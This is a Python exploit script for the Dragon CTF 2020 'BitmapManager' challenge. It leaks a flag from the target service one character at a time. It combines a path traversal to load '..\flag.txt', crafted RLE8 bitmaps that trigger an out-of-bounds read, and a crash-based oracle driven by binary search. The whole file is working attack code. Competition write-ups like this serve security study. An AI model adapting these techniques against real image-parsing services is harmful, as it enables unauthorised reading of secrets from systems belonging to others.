#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             BitmapManager
# Competition:      Dragon CTF 2020
# Category:         Software exploitation
# Scoring:          485 pts (hard)
# Number of solves: 2 out of 539 teams

import struct
import socket
import sys
import telnetlib

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer[:-len(text)]

def dw(x):
  return struct.pack("<H", x)

def dd(x):
  return struct.pack("<I", x)

##########################################################################
# Exploit start
##########################################################################

def load_builtin(s, name):
  read_until(s, "Option: ")
  s.sendall("load_builtin\n")
  read_until(s, "Name: ")
  s.sendall("%s\n" % name)

def load_custom(s, bitmap):
  read_until(s, "Option: ")
  s.sendall("load\n")
  read_until(s, "Name: ")
  s.sendall("test\n")
  read_until(s, "Number of bytes: ")
  s.sendall("%d\n" % len(bitmap))
  read_until(s, "Bitmap data: ")
  s.sendall("%s\n" % " ".join(map(lambda x: "%x" % ord(x), bitmap)))

sock = None
def test_flag_at_offset(host, port, char_offset, threshold):
  global sock

  # Reuse the existing connection as an optimization, when available.
  if sock == None:
    sock = socket.socket()
    sock.connect((host, port))

  # Make sure the flag string is present on the stack.
  load_builtin(sock, "..\\flag.txt")

  # Craft the oracle bitmap.
  OFFSET_TO_FLAG = 0x120
  TOTAL_BITMAP_SIZE = OFFSET_TO_FLAG + char_offset
  RLE_STREAM_OFFSET = OFFSET_TO_FLAG + char_offset - 3

  file_header = (
    "BM" +                    # bfType
    dd(TOTAL_BITMAP_SIZE) +   # bfSize
    dw(0) +                   # bfReserved1
    dw(0) +                   # bfReserved2
    dd(RLE_STREAM_OFFSET)     # bfOffBits
  )

  info_header = (
    dd(0x28) +                # biSize
    dd(0x7f) +                # biWidth
    dd(0x1) +                 # biHeight
    dw(0x1) +                 # biPlanes
    dw(0x8) +                 # biBitCount
    dd(0x1) +                 # biCompression (BI_RLE8)
    dd(0x3) +                 # biSizeImage
    dd(10000) +               # biXPelsPerMeter
    dd(10000) +               # biYPelsPerMeter
    dd(0x1) +                 # biClrUsed
    dd(0x0)                   # biClrImportant
  )

  bitmap = (file_header + info_header).ljust(RLE_STREAM_OFFSET, "\x00")

  # First two bytes of the RLE stream: shift the destination pointer such that
  # there are only `threshold` bytes available to fill.
  bitmap += chr(0x80 - threshold) + "\x00"

  # Last byte of the RLE stream is an "absolute mode" marker, which is followed
  # directly by a character from the flag. It is read out-of-bounds and used
  # as the number of subsequent bytes to copy. Depending on the value of the
  # character, it will either trigger an ASAN crash and disconnect, or
  # complete successfully and print out an error message.
  bitmap += "\x00"

  # Load the oracle bitmap.
  load_custom(sock, bitmap)

  # Observe the oracle output by checking the state of the connection.
  disconnected = False
  try:
    read_until(sock, "Error: ")
  except:
    sock = None
    disconnected = True

  return disconnected

def main(argv):
  host = "localhost"
  port = 4141

  if len(argv) >= 2:
    host = argv[1]
  if len(argv) >= 3:
    port = int(argv[2])

  flag = ""
  while (len(flag) == 0) or (flag[-1] != "}"):
    offset = len(flag)
    lower = 0
    upper = 0x80
    last_valid = None

    while lower != upper:
      check = (lower + upper + 1) // 2

      ret = test_flag_at_offset(host, port, offset, check)

      if ret:
        last_valid = check
        lower = check
      else:
        upper = check - 1

    last_valid += 1
    flag += chr(last_valid)
    print("[+] Found letter %c, partial flag: %s" % (chr(last_valid), flag))

  print("[+] Final flag: %s" % flag)

if __name__ == "__main__":
  main(sys.argv)
